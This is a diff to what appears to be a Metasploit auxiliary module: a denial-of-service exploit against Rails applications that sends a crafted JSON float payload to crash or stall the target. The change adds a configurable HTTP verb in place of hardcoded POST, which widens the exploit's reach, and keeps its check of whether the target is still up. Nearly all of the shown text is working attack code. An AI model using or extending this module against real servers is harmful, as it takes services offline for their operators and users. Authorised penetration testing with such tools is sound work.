@@ -36,12 +36,17 @@ class Metasploit3 < Msf::Auxiliary
       'DisclosureDate' => 'Nov 22 2013'))
     register_options(
       [
-        OptString.new('TARGETURI', [false, 'The URL of the vulnerable Rails application', '/'])
+        OptString.new('TARGETURI', [false, 'The URL of the vulnerable Rails application', '/']),
+        OptString.new('HTTPVERB', [false, 'The HTTP verb to use', 'POST'])
       ], self.class)
   end
 
   def uri
     normalize_uri(target_uri.path.to_s)
+  end
+
+  def verb
+    datastore['HTTPVERB'] || 'POST'
   end
 
   def digit_pattern
@@ -74,13 +79,13 @@ class Metasploit3 < Msf::Auxiliary
     sploit = '['
     sploit << evil_float_string
     sploit << ']'
-    print_status "#{peer} - Sending DoS HTTP#{datastore['SSL'] ? 'S' : ''} request to #{uri}"
+    print_status "#{peer} - Sending DoS HTTP#{datastore['SSL'] ? 'S' : ''} #{verb} request to #{uri}"
     target_available = true
 
     begin
       res = send_request_cgi(
         {
-          'method'  => 'POST',
+          'method'  => verb,
           'uri'     => uri,
           'ctype'   => "application/json",
           'data'    => sploit
@@ -101,7 +106,7 @@ class Metasploit3 < Msf::Auxiliary
     print_status "#{peer} - Checking availability"
     begin
       res = send_request_cgi({
-        'method' => 'POST',
+        'method' => verb,
         'uri' => uri,
         'ctype' => "application/json",
         'data' => Rex::Text.rand_text_alpha(1+rand(64)).to_json
